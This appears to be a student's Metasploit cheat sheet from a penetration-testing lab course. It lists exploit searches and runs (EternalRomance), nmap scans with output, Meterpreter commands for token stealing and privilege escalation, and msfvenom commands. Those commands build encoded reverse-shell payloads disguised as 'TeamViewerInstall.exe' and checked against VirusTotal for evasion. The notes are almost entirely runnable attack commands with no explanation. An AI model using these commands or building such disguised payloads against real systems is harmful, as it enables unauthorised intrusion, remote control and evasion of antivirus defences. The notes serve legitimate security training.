#metasploit
```msfconsole
search eternalromance
search eternalromance type:exploit
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

```msfconsole
use 0
options
info
```

```msfconsole
set RHOSTS 10.10.10.40
setg RHOSTS 10.10.10.40
run
```

```sh
sudo nmap -sV 10.129.73.152 -v
```
out:
```out
...snip...
PORT    STATE SERVICE      VERSION  
80/tcp  open  http         Microsoft IIS httpd 10.0  
135/tcp open  msrpc        Microsoft Windows RPC  
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn  
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds  
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
...snip...
```

```metasploit
search eternalromance
set rhosts 10.129.73.152
set lhosts 10.10.14.82
run
shell
```

```metasploit
show targets
show payloads
grep meterpreter show payloads
grep -c meterpreter show payloads
grep meterpreter grep reverse_tcp show payloads
grep -c meterpreter grep reverse_tcp show payloads
```

```meterpreter
help
```

```sh
sudo nmap -sV 10.129.203.52 -v
```

```
...snip...
PORT     STATE SERVICE VERSION  
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)  
8081/tcp open  http    Jetty 9.4.12.v20180830  
8082/tcp open  http    Jetty 9.4.12.v20180830  
8083/tcp open  http    Jetty 9.4.12.v20180830  
8888/tcp open  http    Jetty 9.4.12.v20180830  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...snip...
```

```msfconsole
search Apache Druid
```

```meterpreter
search -f flag.txt
```

```
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl

msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai

msfvenom -p- --platform windows -a x86 -e x86/shikata_ga_nai -i3 -f exe < /tmp/9F88A4BBAFF1B8F530EE29F7226B3338 > shikata.exe

msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe

msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe

msf-virustotal -k <API key> -f TeamViewerInstall.exe
```

```
workspace -h
jobs -l
```

```
ctrl+z
session -i 1
```

```
search sudo cve:2021
set session 1
bg
```

```
search local_exploit_suggester
```

```
set LHOST tun0
```

```
search FortiLogger
search local_exploit_suggester

```

```
ps
steal_token 1836

```

```
searchsploit
```